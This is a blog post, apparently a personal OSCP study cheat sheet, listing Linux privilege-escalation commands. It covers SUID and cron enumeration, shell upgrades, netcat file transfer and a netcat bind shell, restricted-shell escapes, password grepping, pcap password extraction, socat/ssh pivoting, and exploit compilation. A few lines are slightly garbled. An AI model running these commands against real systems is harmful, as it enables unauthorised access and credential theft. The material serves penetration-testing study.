[](#){#to-top}

:::::::::::::::::::::: {#header}
:::::::::: top-nav-wrapper
::::::::: {#top-nav .container .section}
::::: {#LinkList111 .widget .LinkList data-version="1"}
:::: widget-content
- [](http://www.facebook.com/HackingDream){target="_blank"}
- [](http://www.twitter.com/HackingDream){target="_blank"}
- [](https://www.youtube.com/channel/UCKgOUVTaT-6LKLvUQhfBhig){target="_blank"}

::: clear
:::
::::
:::::

::::: {#LinkList123 .widget .LinkList data-version="1"}

:::: widget-content
- [ Home](http://www.hackingdream.net)
- [ About Author](http://www.hackingdream.net/p/about-author.html)
- [ Contact US](http://www.hackingdream.net/p/contact-us.html)

::: clear
:::
::::
:::::
:::::::::
::::::::::

:::::: logo-container
::::: {#logo-container .container .section}
:::: {#Header1 .widget .Header data-version="1"}
::: {#header-inner}
[](https://www.hackingdream.net/)

# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png){#Header1_headerimg height="120px; " width="360px; "}
:::
::::
:::::
::::::

::::::::: main-nav-wrapper
:::::::: {.container .clearfix}
::: {#mobile-main-nav-btn}
Main menu
:::

[]{#search-icon}

::::: {#main-nav .section}
:::: {#LinkList222 .widget .LinkList data-version="1"}
close

::: widget-content
- [ Home](http://www.hackingdream.net){itemprop="url"}
- [ AI
  Sec](https://www.hackingdream.net/search/label/AI){itemprop="url"}
- [ AI
  Pentest](http://www.hackingdream.net/search/label/AI%20Attacks){itemprop="url"}
- [
  Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet){itemprop="url"}
- [
  Pentest](https://www.hackingdream.net/search/label/Pentest){itemprop="url"}
- [\_Active
  Directory](https://www.hackingdream.net/search/label/Active%20Directory){itemprop="url"}
- [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux){itemprop="url"}
- [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking){itemprop="url"}
- [\_Target
  Hacking](http://www.hackingdream.net/search/label/Target%20Hacking){itemprop="url"}
- [ Purple
  Team](https://www.hackingdream.net/search/label/Purple%20Team){itemprop="url"}
- [ Bin
  Exp](https://www.hackingdream.net/search/label/Exploitation){itemprop="url"}
- [ How To](#){itemprop="url"}
- [\_Blogging](http://www.hackingdream.net/search/label/Blogging){itemprop="url"}
- [\_Solved
  Problems](http://www.hackingdream.net/search/label/Solved%20Problems){itemprop="url"}
- [\_Money
  Making](http://www.hackingdream.net/search/label/Money%20Making){itemprop="url"}
- [\_Top
  Ten](http://www.hackingdream.net/search/label/Top%20Ten){itemprop="url"}
- [\_Gaming](http://www.hackingdream.net/search/label/Games){itemprop="url"}
:::
::::
:::::

::: search
:::
::::::::
:::::::::
::::::::::::::::::::::

:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: main-content
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: {.container .clearfix}
:::::::::::::::::::::::::::::::::::::::::::::::: {#blog-posts-wrapper}
::::::::::::::::::::::::::::::::::::::::::::::: {#blog-posts .main .section}
:::::::::::::::::::::::::::::::::::::::::::::: {#Blog1 .widget .Blog data-version="1"}
:::::::::::::::::::::::::::::::::::::::::::: {.blog-posts .hfeed}
:::::::::::::::::::::::::::::::::::: post-outer
:::::::::::::::::::::::::::::::: {.post .hentry .uncustomized-post-template}
::::::::::::::::::::::::::::::: {itemprop="blogPost" itemscope="itemscope" itemtype="http://schema.org/BlogPosting"}
::: {itemprop="image" itemscope="itemscope" itemtype="https://schema.org/ImageObject" style="display:none;"}
:::

[]{#1629991732287281578}

::: post-header
### Linux Privilege Escalation Cheatsheet for OSCP {#linux-privilege-escalation-cheatsheet-for-oscp .post-title .entry-title .heading itemprop="name headline"}

[ ]{.post-timestamp}

[[March 07, 2020]{.abbr .published itemprop="datePublished dateModified"
title="2020-03-07T22:37:00+05:30"}](https://www.hackingdream.net/2020/03/linux-privilege-escalation-cheatsheet-for-oscp.html "permanent link"){.timestamp-link
rel="bookmark"}
:::

::::::::::::::::::: {#post-body-1629991732287281578 .post-body .entry-content itemprop="articleBody"}
::::::::::::::::: {dir="ltr" style="text-align: left;" trbidi="on"}
\
\

::: {.MsoNormal style="line-height: 200%; text-align: justify;"}
[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2hHHEI0YxxhF41YY9l5DmlnwZxQwcpNypx7oecXGNczdEAfbFaiqgIYncQXdYW62Ic5tLV3tqgFy8a5nxPCTYqsGORoBelq2F4extc9LttA8cyB8GRhRGR9kAyEMtZIuyIXhF2B4rNCc/s320/Linux_privilege_escalation_cheatsheet.jpg){border="0"
original-height="1414" original-width="1200" height="320" loading="lazy"
width="271"}](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2hHHEI0YxxhF41YY9l5DmlnwZxQwcpNypx7oecXGNczdEAfbFaiqgIYncQXdYW62Ic5tLV3tqgFy8a5nxPCTYqsGORoBelq2F4extc9LttA8cyB8GRhRGR9kAyEMtZIuyIXhF2B4rNCc/s1600/Linux_privilege_escalation_cheatsheet.jpg){style="clear: right; float: right; margin-bottom: 1em; margin-left: 1em;"}[Hello
Everyone,  below is the privilege escalation cheat sheet that I used to
pass my OSCP certification. You can find lots of commands mixed to
enumerate through a lot of situations. There might be few commands which
might not be work on all the distortion of Linux. Feel free to comment
below if I missed any useful commands.  If you are looking for the Linux
Privilege Escalation Techniques here you go \--\> [Linux Privilege
Escalation
Techniques](https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html){target="_blank"} and
here is [Windows Privilege Escalation command and
Techniques](https://www.hackingdream.net/2020/03/windows-privilege-escalation-cheatsheet-for-oscp.html){target="_blank"}]{face="verdana, sans-serif"}
:::

## [Simple Linux Priv Esc Checklist]{face="verdana, sans-serif" style="font-size: x-large;"} {#simple-linux-priv-esc-checklist style="line-height: 200%; text-align: justify;"}

<div>

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
1. sudo -l

2.sudo su

3.  uname -a                   /version  --> check for vuln

4. Check for files with root priv

5. Check for cron jobs

6. /etc/passwd file --> writable ?

7. #PATH exploit

8.  Check for process with root

9.  Run pspy to check for running processes & cron jobs

10.Check .bash_history

11.ls -la the home directory

12.Check /opt/, /var/www/html, /home/, /root, / ,  directories thoroughly 

13.Check for World Readable files 

14.Check if mysql is running as
root. 

15."mount" command to check for permissions on folders/processes 

16.Run "pspy -f"  on the target and check for all running file system tasks

17.Check for file/folder permissions, even u dont own the file, folder might be owned by you, where you
can add/delete files/filenames.

Ex: File is running as Root; folder owner is you.; delete the file and create a
new file with the same name. you can get root access. 
```

[ ]{face="verdana, sans-serif" style="font-size: large;"}

</div>

<div>

\
[]{face="verdana, sans-serif" style="font-size: x-large;"} [
]{face="verdana, sans-serif" style="font-size: x-large;"}\

## [ ]{face="verdana, sans-serif" style="font-size: x-large;"} {#section style="background-position: 0px 0px; border-bottom: 4px solid rgb(70, 144, 179); border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; box-sizing: border-box; color: #666666; font-family: \"bree serif\", serif; font-size: 36px; font-stretch: inherit; font-style: inherit; font-variant: inherit; font-weight: normal; line-height: 44px; margin: 10px 0px; outline: 0px; padding: 0px 0px 5px; position: relative; transition: all; vertical-align: baseline;"}

[ ]{face="verdana, sans-serif" style="font-size: x-large;"}

</div>

<div>

**[THIS IS MERELY CREATED FOR EDUCATIONAL & ETHICAL PURPOSE ONLY, AUTHOR
IS NOT RESPONSIBLE FOR ANY ILLEGAL ACTIVITIES DONE BY THE
VISITORS]{style="border: 1pt none; box-sizing: border-box; color: blue; font-size: 15pt; line-height: 40px; margin: 0px; padding: 0in; transition: 0.3s ease-in-out; vertical-align: baseline;"}**

</div>

##  {#section-1 style="background-attachment: initial; background-clip: initial; background-image: initial; background-origin: initial; background-position: 0px 0px; background-repeat: initial; background-size: initial; border-bottom: 4px solid rgb(70, 144, 179); border-image: initial; border-left: 0px; border-right: 0px; border-top: 0px; box-sizing: border-box; color: #666666; font-family: \"bree serif\", serif; font-size: 36px; font-stretch: inherit; font-style: inherit; font-variant: inherit; font-weight: normal; line-height: 44px; margin: 10px 0px; outline: 0px; padding: 0px 0px 5px; position: relative; transition: all; vertical-align: baseline; widows: 1;"}

## [Linux Privilege Escalation Cheatsheet]{face="verdana, sans-serif" style="font-size: x-large;"} {#linux-privilege-escalation-cheatsheet style="line-height: 200%; text-align: left;"}

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
sudo -l            --> Check for root priv directories and applications
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
sudo bash                --> Get Root Shell
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
sudo id                    --> Check Privilege level
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
Operating System Details 

uname -a            

cat /proc/version
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
ps aux | grep root             --> check for Applications running with root

ps -ef
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
dpkg -l        --> list all available packages.
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
python -c 'import pty;pty.spawn("/bin/bash")'   --> spwan a python shell; sometimes python3 works as well
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
Get Interactive Shell:

python -c 'import pty;pty.spawn("/bin/bash")'
ctrl +Z 
stty raw -echo
fg
export TERM=xterm 
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
Python Interactive Shell (New)

#on Victim
python3 -c 'import pty;pty.spawn("/bin/bash")'

#on Attacker Host - get the rows & Columns 
#Example  rows 31; columns 121
stty -a 

#on Victim 
stty rows 31 col 121
export TERM=xterm
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
Finding Files with Root Privileges: 

find / -perm -4000 2>/dev/null | xargs ls -la
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; margin-top: 43px; overflow: auto; padding: 20px;"}
Finding World Readable Files:

find / -perm -2 ! -type l -ls 2>/dev/null

World Writable & Executable files
find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

World Executable Folders:
find / -perm -o x -type d 2>/dev/null
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
Find SUID & SGID  Binaries:

#SUID
find / -perm -4000 2>/dev/null

# SGID or SUID
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done 

#Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -1000 -type d 2>/dev/null     

#SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -g=s -type f 2>/dev/null      

#SUID (chmod 4000) - run as the owner, not the user who started it.
find / -perm -u=s -type f 2>/dev/null  
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; margin-top: 43px; overflow: auto; padding: 20px;"}
List the Capabilities of files  which has Root Privileges

getcap -r / 2>/dev/null 

Linux Capalilities - 40 Using Capabiliies 

#List all Capabilities 
#cap_sys_module is exploitable
capsh --print

Priv Esc using Sys_Module Capability in Docker
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; margin-top: 43px; overflow: auto; padding: 20px;"}
Find Services Running Behind Firewall/Localhost 

netstat -ano

netstat -tulpn
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; margin-top: 43px; overflow: auto; padding: 20px;"}
CRON Jobs 

crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root 
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
find . -type f -ls         --> /Find files in all directories 
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
python -m SimpleHTTPServer 8080  --> Start a communication server on your system

wget http://yourip/LinuxEnum.sh  --> Run this in target machine to get this file
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
Send a File From Kali To Victim

nc -nlvp 9001 < exploit.c  --> Transfer files from Kali 

nc YourIpAddress 8001 > /tmp/exploit.c  --> Get the file On Target Machine
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
Get a File From Victim to Kali

on Kali: nc -l -p 8001 > filefoldername

on victim: nc -w 5 10.10.14.14 8001 < /usr/local/bin/filename 
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
When anything can only be run as a specific user:

sudo -u UserName /bin/bash             /works when you see this in sudo -l      
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
Port Scanning with NMAP:

for ip in $(seq 1 65535); do nc -nvzw1 VICTIM_IP $p 2>&1; done | grep open
```

<div>

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
Dynamic Port Forwarding 

nano /etc/proxychains.conf

#add the below line 
socks5 127.0.0.1 1080 

On Terminal:

ssh -D 1080 root@10.10.10.10       /Need Password

proxychains netdiscover -r 10.10.10.10/24
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
Local Port Forwarding using ssh 

ssh -L 1080:127.0.0.1:80 root@10.10.10.10
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
Remote Port Forwarding using SSH 

ssh -R 1080:127.0.0.1:80 root@10.10.10.10
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
Port Forwarding using Netcat

nc -l -p $localport -c "nc $remotehost $remoteport"

netcat -nvlp 9001       /Listen on port 9001

netcat -l -p 9001 -e /bin/bash  /Create a bash shell on port 9001

netcat -L KALI_IP:80 -p 8902            /Forward local port 9002 to remote port 80

netcat -L kali_IP:80 -p 9002 -x        /Port Forward Hex dump
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
Port Forwarding using mknod 

mknod can be used to make files,directories and FIFO's(Named Pipe)

mknod backpipe p / p = create a named pipe

nc -l -p Allowed_Inbound_port 0<backpipe | nc 127.0.0.1 22 1>backpipe
  
 1 = Standard Output
 0 = Standard Input
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
Netcat Relay to Forward SSH on our linux machine with Scenario

you are on a windows box, trying to connect to a linux machine whose SSH-22 port inbound traffic is blocked. 
we have a shell on linux machine but not ssh -so trying to get into ssh 

so, find some port which is open on Linux machine, and use nc to communicate, ex:4444

on Linux Machine:

We need to transfer traffic from port 22 to 4444 and access it on windows machine.

mknod /tmp/backpipe p
nc -l -p 4444 0</tmp/backpipe | nc localhost 22 1>/tmp/backpipe
 
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
Port Forwarding using SoCat:

Start a socat listener on Victim_macine2 - Port 8009 & 8080, and listen it on First compromisted machine.

From Victim-1 machine: do a port scan as above and port forrward the required ports
/Binding the VICTIM-2 ports to Victim-1 Machine so,that we can access it from our Kali machine

socat tcp-listen:8009,fork tcp:VICTIM2_IP:8009 &  
socat tcp-listen:8080,fork tcp:VICTIM2_IP:8080 & 

netstart -plunt    /View the binded ports, we can see 8009 & 8080 in Victim_machine1


Access the Victim-2 Ports on our Kali Machine:on Victim-1 Machine: 

socat tcp-listen:4321,fork tcp:KALI_IP:4321 & 
```

</div>

<div>

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
Compiling Exploit 

gcc exploit.c -pthread -lcrypt -o Exploit  --> Compile The Exploit

gcc -m32 -Wl,--hash-style=both 9542.c -o exploit  --> Compiling 32-bit Exploit

./Exploit
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
Check for Unmounted Drives

cat etc/fstab 
```

</div>

<div>

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
cat .bash_history   -->  Check the Commands History
```

</div>

<div>

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
cho os.system("/bin/bash")       --> Escaping Limited Shell using ssh       
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
df -h                --> Get List of Machine Partitions (Mounted Devices as well) 
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
/dev/shm      --> can copy any files into this location and run without permissions
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
cat /dev/sdb               --> Might contain deleted data in the partition
                               can try strings /dev/sdb for flags
```

</div>

<div>

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
find / -perm -4000 -user root -exec ls -ld {} \; 2>/dev/null
          --> all files and dir with root access 
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); margin-top: 43px; overflow: auto; padding: 20px;"}
Grep Recursively for a string 

grep -iRI 'password'

#Grep for a username/string 
grep 'bhanu' /etc -R 2>/dev/null
```

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); color: #333333; font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh 
                  --> get a proper shell from a restricted shell
```

</div>

<div>

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
mysql -u root -p               // logging as a root in mysql 

\! ls -l                       //Execute Commands 
```

</div>

<div>

``` {#62b2 .graf .graf--pre .graf-after--p style="background: rgba(0, 0, 0, 0.047); font-size: 14px; margin-top: 43px; overflow: auto; padding: 20px;"}
Finding Passwords from a PCAP file using TCPDUMP:

tcpdump -nt -r capture.pcap -A 2>/dev/null | grep -P 'pwd=' 
```

</div>

<div>

[[\
]{style="font-size: x-large;"}]{face="verdana, sans-serif"}

</div>

<div>

::: {.MsoNormal style="line-height: 150%; text-align: justify;"}
[If I missed something, feel free to command below and If you are
looking for the Linux Privilege Escalation Techniques here you go
\--\> ]{face="verdana, sans-serif"}[[Linux Privilege Escalation
Techniques](https://www.hackingdream.net/2020/03/linux-privilege-escalation-techniques.html){target="_blank"} ]{face="verdana, sans-serif"}

[here is ]{face="verdana, sans-serif"}[Windows Privilege Escalation
command and
Techniques](https://www.hackingdream.net/2020/03/windows-privilege-escalation-cheatsheet-for-oscp.html){style="font-family: verdana, sans-serif;"
target="_blank"}
:::

</div>

\
\
:::::::::::::::::

::: {style="clear: both;"}
:::
:::::::::::::::::::

::::::: post-footer
:::: {.post-footer-line .post-footer-line-1}
[ ]{.reaction-buttons} [ ]{.post-comment-link} [ ]{.post-backlinks
.post-comment-link} [ [
[![](https://img1.blogblog.com/img/icon18_email.gif){.icon-action
height="13"
width="18"}](https://www.blogger.com/email-post/7320167475718896234/1629991732287281578 "Email Post")
]{.item-action} ]{.post-icons}

::: {.post-share-buttons .goog-inline-block}
:::
::::

::: {.post-footer-line .post-footer-line-2}
[
[Cheatsheet](https://www.hackingdream.net/search/label/Cheatsheet){.post-label-anchor
rel="tag"}, [Kali
Linux](https://www.hackingdream.net/search/label/Kali%20Linux){.post-label-anchor
rel="tag"},
[Linux](https://www.hackingdream.net/search/label/Linux){.post-label-anchor
rel="tag"},
[OSCP](https://www.hackingdream.net/search/label/OSCP){.post-label-anchor
rel="tag"}, [Pen
Testing](https://www.hackingdream.net/search/label/Pen%20Testing){.post-label-anchor
rel="tag"},
[Pentest](https://www.hackingdream.net/search/label/Pentest){.post-label-anchor
rel="tag"} ]{.post-labels}
:::

::: {.post-footer-line .post-footer-line-3}
[ ]{.post-location}
:::
:::::::

:::: {.post-bottom .clearfix}
[ By: [ [Bhanu Namikaze]{itemprop="name"} ]{.fn itemprop="author"
itemscope="itemscope" itemtype="http://schema.org/Person"}
]{.post-author .vcard}

::: post-share
[](http://www.facebook.com/sharer.php?u=https://www.hackingdream.net/2020/03/linux-privilege-escalation-cheatsheet-for-oscp.html){.post-share_link
.facebook target="_blank"}
[](http://twitter.com/share?url=https://www.hackingdream.net/2020/03/linux-privilege-escalation-cheatsheet-for-oscp.html){.post-share_link
.twitter target="_blank"}
[](http://pinterest.com/pin/create/button/?source_url=https://www.hackingdream.net/2020/03/linux-privilege-escalation-cheatsheet-for-oscp.html&description=Hacking%20Dream:Linux%20Privilege%20Escalation%20Cheatsheet%20for%20OSCP&media=https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2hHHEI0YxxhF41YY9l5DmlnwZxQwcpNypx7oecXGNczdEAfbFaiqgIYncQXdYW62Ic5tLV3tqgFy8a5nxPCTYqsGORoBelq2F4extc9LttA8cyB8GRhRGR9kAyEMtZIuyIXhF2B4rNCc/s320/Linux_privilege_escalation_cheatsheet.jpg){.post-share_link
.pinterest
onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=300,width=600');return false;"
target="_blank"}
[](https://plus.google.com/share?url=https://www.hackingdream.net/2020/03/linux-privilege-escalation-cheatsheet-for-oscp.html){.post-share_link
.googleplus target="_blank"}
[](http://www.linkedin.com/shareArticle?url=https://www.hackingdream.net/2020/03/linux-privilege-escalation-cheatsheet-for-oscp.html&title=Linux%20Privilege%20Escalation%20Cheatsheet%20for%20OSCP){.post-share_link
.linkedin
onclick="window.open(this.href, 'windowName', 'width=600, height=400, left=24, top=24, scrollbars, resizable'); return false;"
rel="nofollow" target="_blank"}
:::
::::

:::: {itemprop="publisher" itemscope="itemscope" itemtype="https://schema.org/Organization" style="display:none;"}
::: {itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"}
:::
::::
:::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::

::::: author-info
:::: clearfix
::: author-avatar-wrapper
![](//lh5.googleusercontent.com/-5klQY__bhSE/AAAAAAAAAAI/AAAAAAAAFfc/f8794NZCX3M/s512-c/photo.jpg){.author-avatar}
:::

##### Bhanu Namikaze {#bhanu-namikaze .author-name}

Bhanu Namikaze is an Ethical Hacker, Security Analyst, Blogger, Web
Developer and a Mechanical Engineer. He Enjoys writing articles,
Blogging, Debugging Errors and Capture the Flags. Enjoy Learning; There
is Nothing Like Absolute Defeat - Try and try until you Succeed.
::::
:::::
::::::::::::::::::::::::::::::::::::

:::: {#related-posts}
::: clearfix
:::
::::

- [](https://www.hackingdream.net/2020/03/windows-privilege-escalation-cheatsheet-for-oscp.html){#Blog1_blog-pager-newer-link
  .newer-link}
- [](https://www.hackingdream.net/2020/03/best-programming-languages-for-mobile-app-development.html){#Blog1_blog-pager-older-link
  .older-link}

::::::: {#comments .comments}
[]{#comments}

#### No comments:

::: {#Blog1_comments-block-wrapper}
:::

::: comment-form
[]{#comment-form}

#### Post a Comment {#comment-post-message}

[](https://www.blogger.com/comment/frame/7320167475718896234?po=1629991732287281578&hl=en&saa=85391&origin=https://www.hackingdream.net){#comment-editor-src}
:::

:::: {#backlinks-container}
::: {#Blog1_backlinks-container}
:::
::::
:::::::
::::::::::::::::::::::::::::::::::::::::::::

::: post-feeds
:::
::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::

:::::::::::::: {#wp-sidebar .sidebar-wrapper itemscope="" itemtype="http://schema.org/WPSideBar"}
::::::::::::: {#sidebar .section}
::::: {#HTML7 .widget .HTML data-version="1"}
## Search for a Post {#search-for-a-post .title}

::: widget-content
:::

::: clear
:::
:::::

:::::: {#HTML3 .widget .HTML data-version="1"}
## Recent Posts {#recent-posts .title}

:::: widget-content
::: recentpoststyle
[Recent Posts
Widget](http://www.hackingdream.net/2015/12/recent-post-widgets-for-blogger-with-thumbnails.html){style="font-size: 9px; color: #CECECE; float: right; margin: 5px;"}

Your browser does not support JavaScript!
:::
::::

::: clear
:::
::::::

::::: {#HTML5 .widget .HTML data-version="1"}
## Popular Posts {#popular-posts .title}

::: widget-content
[Recent Posts
Widget](http://www.hackingdream.net/2015/12/recent-post-widgets-for-blogger-with-thumbnails.html){style="font-size: 9px; color: #CECECE; float: right; margin: 5px;"}

Your browser does not support JavaScript!
:::

::: clear
:::
:::::
:::::::::::::
::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

::::::: {#social-bottom-wrapper}
:::::: {#social-bottom .section}
::::: {#LinkList333 .widget .LinkList data-version="1"}
:::: widget-content
- [facebook](http://www.facebook.com/HackingDream){target="_blank"}
- [twitter](http://www.twitter.com/HackingDream){target="_blank"}
- [youtube](https://www.youtube.com/channel/UCKgOUVTaT-6LKLvUQhfBhig){target="_blank"}

::: clear
:::
::::
:::::
::::::
:::::::

::::::::::::::::::::: {#footer-wrapper .clearfix}
::::::::::::::::::: {.container .clearfix}
:::::: {#footer-left .section}
::::: {#HTML6 .widget .HTML data-version="1"}
## About us {#about-us .title}

::: widget-content
![about
footer](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPNiXyJNB8w-IovFpOQWeftMUoBrVjS1T-fL9Xe9iixFQvIijmZC4TC0j8Y8E384vrStxGn58Etcw-KbG-ISpaK5eL3payYyjd84WHa9Ps9GQUFd0qToRbnLzW4Sz4R5s46i73WmcJvPQb/s1600/Size-Modified.png)\
\
Hacking Dream is a site where you can learn Various Hacking - Methods,
Tricks, Tips. We mainly discuss about Wifi Hacking Methods and its
security networks\

- [](https://www.facebook.com/HackingDream){target="_blank"}
- [](https://twitter.com/HackingDream){target="_blank"}
- [](https://www.youtube.com/channel/UCKgOUVTaT-6LKLvUQhfBhig){target="_blank"}
- [](https://plus.google.com/+BhanuNamikaze){target="_blank"}
- [](http://www.pinterest.com/Bhanunamikaze){target="_blank"}
- [](https://www.linkedin.com/in/bhanunamikaze){target="_blank"}
- [](#)
- [](http://www.instagram.com/BhanuNamikaze){target="_blank"}
:::

::: clear
:::
:::::
::::::

:::::: {#footer-center .section}
::::: {#Label2 .widget .Label data-version="1"}
## Labels

:::: {.widget-content .cloud-label-widget-content}
[ [Active
Directory](https://www.hackingdream.net/search/label/Active%20Directory){dir="ltr"}
]{.label-size .label-size-3} [
[AI](https://www.hackingdream.net/search/label/AI){dir="ltr"}
]{.label-size .label-size-4} [ [AI
Attacks](https://www.hackingdream.net/search/label/AI%20Attacks){dir="ltr"}
]{.label-size .label-size-2} [
[Andriod](https://www.hackingdream.net/search/label/Andriod){dir="ltr"}
]{.label-size .label-size-1} [
